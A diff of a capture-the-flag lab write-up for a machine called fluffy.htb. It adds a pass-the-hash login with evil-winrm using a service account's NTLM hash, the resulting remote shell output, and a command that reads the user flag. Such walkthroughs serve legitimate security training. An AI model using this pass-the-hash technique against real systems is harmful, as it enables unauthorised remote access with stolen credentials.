@@ -496,5 +496,27 @@ Certipy v5.0.2 - by Oliver Lyak (ly4k)
 
 Since we have hash for winrm_svc we can use Evil-winrm to get remote shell as winrm_svc
 ```bash
-evil-winrm -i fluffy.htb -u winrm_svc -H '33bd09dcd697600edf6b3a7af4875767' -dc-ip 10.10.11.69
+evil-winrm -i fluffy.htb -u winrm_svc -H '33bd09dcd697600edf6b3a7af4875767'
+```
+
+Output:
+```bash
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\winrm_svc\Documents> 
+
+```
+And Now we have a shell! Get the user flag from the desktop using
+```cmd
+type ..\Desktop\user.txt
+```
+ ### FLAG 1
+ ```bash
+ *Evil-WinRM* PS C:\Users\winrm_svc\Documents> type ..\Desktop\user.txt
+ee5211{REDACTED}f170791e7
 ```
